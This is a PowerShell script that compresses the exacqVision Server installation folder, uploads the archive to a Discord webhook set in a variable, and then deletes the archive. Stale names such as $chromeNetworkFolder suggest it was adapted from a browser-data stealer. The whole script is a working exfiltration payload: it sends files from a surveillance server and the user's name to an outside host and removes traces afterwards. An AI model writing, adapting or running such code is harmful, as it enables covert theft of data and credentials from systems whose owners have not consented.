# Define folder paths
$chromeNetworkFolder = "C:\Program Files\exacqVision\Server"

# Define zip file names
$chromeZip = "$env:TEMP\Exacqvision.zip"

# Compress the Chrome network folder
Compress-Archive -Path $chromeNetworkFolder -DestinationPath $chromeZip


# Discord webhook upload function
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text
    )

    $hookurl = "$dc"

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file=@$file" $hookurl
    }
}

# Upload the zipped files to Discord
Upload-Discord -file $chromeZip
# Clean up: remove the zip files after upload
Remove-Item -Path $chromeZip -Force
